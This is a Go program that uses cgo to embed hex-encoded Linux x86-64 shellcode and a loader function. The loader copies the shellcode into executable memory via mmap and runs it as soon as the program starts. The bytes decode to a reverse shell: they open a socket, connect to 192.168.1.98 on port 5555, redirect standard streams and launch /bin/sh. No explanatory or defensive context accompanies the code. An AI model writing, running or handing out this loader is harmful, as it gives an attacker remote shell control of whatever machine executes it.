package main

/*
#cgo CFLAGS: -Wall -O2
#cgo LDFLAGS:

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>

unsigned char shellcode[] = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x29\x0f\x05\x48\x89\xc7\x52\x66\x68\x15\xB3\x68\xC0\xA8\x01\x62\x66\x68\x02\x00\x89\xe6\xb0\x2a\x0f\x05\x48\x89\xc7\xb0\x21\x0f\x05\x48\x89\xc7\xb0\x21\xb6\x01\x0f\x05\x48\x89\xc7\xb0\x21\xb6\x02\x0f\x05\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

void ejecutarShellcode() {
    // Calculate the size of the shellcode
    size_t shellcode_size = sizeof(shellcode);

    // Allocate executable memory
    void *exec_mem = mmap(0, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return;
    }

    // Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, shellcode_size);

    // Execute the shellcode
    void (*ret)() = (void(*)())exec_mem;
    ret();
}
*/
import "C"

func main() {
	C.ejecutarShellcode()
}
